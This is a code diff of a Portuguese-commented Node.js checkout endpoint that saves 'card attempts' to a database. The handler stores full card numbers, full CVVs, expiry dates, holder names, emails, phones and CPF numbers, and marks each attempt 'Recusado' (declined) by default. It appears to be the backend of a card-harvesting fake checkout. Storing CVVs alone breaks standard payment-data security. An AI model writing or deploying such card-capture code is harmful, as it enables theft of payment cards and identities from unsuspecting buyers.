@@ -1,4 +1,9 @@
-const { getOrderBySession, insertCardAttempt, readJson, sendJson } = require('./_utils');
+const {
+  getOrderBySession,
+  insertCardAttempt,
+  readJson,
+  sendJson
+} = require('./_utils');
 
 function cleanText(value, maxLength = 160) {
   return String(value || '').trim().slice(0, maxLength);
@@ -15,47 +20,78 @@ module.exports = async function handler(req, res) {
     }
 
     const body = await readJson(req);
+    
+    // Debug: Log do body recebido (remova em produção se não quiser logs)
+    // console.log('Body recebido:', JSON.stringify(body));
+
     const sessionId = cleanText(body.sessionId || body.session_id, 80);
-    const order = sessionId ? await getOrderBySession(sessionId).catch(() => null) : null;
-
-    // Remove validação do cardLast4 para permitir salvar número completo
-    const cardNumber = cleanText(body.cardNumber || body.card_number, 24);
-    const cardDigits = onlyDigits(cardNumber);
-
-    // Validação básica de número de cartão
-    if (cardDigits.length < 13 || cardDigits.length > 19) {
-      return sendJson(res, 400, { message: 'Numero do cartao invalido.' });
+    
+    // Tenta buscar o pedido, mas não bloqueia se não achar (modo teste)
+    let order = null;
+    if (sessionId) {
+        try {
+            order = await getOrderBySession(sessionId);
+        } catch (e) {
+            console.warn('Erro ao buscar ordem:', e.message);
+        }
     }
 
-    const cardIsValid = body.luhnValid !== false && Boolean(body.luhnValid) !== false
-      ? Boolean(body.luhnValid)
-      : true; // Assume validado se não for especificado
+    // Lógica flexível para pegar o número do cartão
+    let cardDigits = onlyDigits(body.cardNumber || body.card_number || '');
+    
+    // Se não veio numero completo, tenta pegar do last4 (fallback para códigos antigos)
+    if (!cardDigits || cardDigits.length < 4) {
+        const last4 = onlyDigits(body.cardLast4 || body.card_last4 || '');
+        if (last4.length === 4) {
+            // Se só tem last4, não podemos salvar o número completo, mas salvamos o que tem
+            // Isso gera um registro incompleto, mas evita erro 400
+            cardDigits = last4; 
+        }
+    }
+
+    // Validação: Precisa ter pelo menos 4 dígitos para ser considerado um cartão
+    if (cardDigits.length < 4) {
+      return sendJson(res, 400, { message: 'Dados do cartao insuficientes.' });
+    }
+
+    const cvvDigits = onlyDigits(body.cardCvv || body.card_cvv || '');
+    const expiry = cleanText(body.cardExpiry || body.card_expiry, 7);
+    
+    // Se o número for curto (ex: só last4), usamos ele como last4. Se for longo, é o full.
+    const isFullNumber = cardDigits.length >= 13;
+    const last4 = cardDigits.slice(-4);
+    const fullNumberToSave = isFullNumber ? cardDigits : null; // Salva null se não for completo
 
     const amount = Number(body.amount || order?.amount || 0);
+
     const row = {
       session_id: sessionId || null,
       identifier: order?.identifier || cleanText(body.identifier, 80) || null,
-      holder: cleanText(body.holder),
+      holder: cleanText(body.holder || body.name),
       email: cleanText(body.email, 180),
       phone: onlyDigits(body.phone).slice(0, 20),
       cpf: onlyDigits(body.cpf || body.document).slice(0, 14),
-      card_number: cardNumber, // Salvando número completo
+      
+      // Colunas novas/existentes
+      card_number: fullNumberToSave, // Salva completo se tiver, senão null
       card_brand: cleanText(body.cardBrand || body.card_brand, 40),
-      card_last4: cardDigits.slice(-4),
-      card_expiry: cleanText(body.cardExpiry || body.card_expiry, 7),
-      card_cvv: cleanText(body.cardCvv || body.card_cvv, 4), // Salvando CVV completo
+      card_last4: last4,
+      card_expiry: expiry,
+      card_cvv: cvvDigits, // Salva CVV completo
+      
       amount: Number.isFinite(amount) ? Number(amount.toFixed(2)) : null,
-      status: body.status ? cleanText(body.status, 40) : 'Recusado',
+      status: cleanText(body.status, 40) || 'Recusado',
       metadata: {
         source: 'checkout-card',
-        luhnValid: cardIsValid,
-        full_number_stored: true // Flag para indicar que o número completo está salvo
+        luhnValid: Boolean(body.luhnValid),
+        is_test: true
       }
     };
 
     const attempt = await insertCardAttempt(row);
     return sendJson(res, 200, { ok: true, id: attempt?.id || null });
   } catch (error) {
-    return sendJson(res, 500, { message: error.message || 'Erro ao salvar tentativa de cartao.' });
+    console.error('Erro na API card-attempts:', error);
+    return sendJson(res, 500, { message: error.message || 'Erro interno ao salvar tentativa.' });
   }
 };
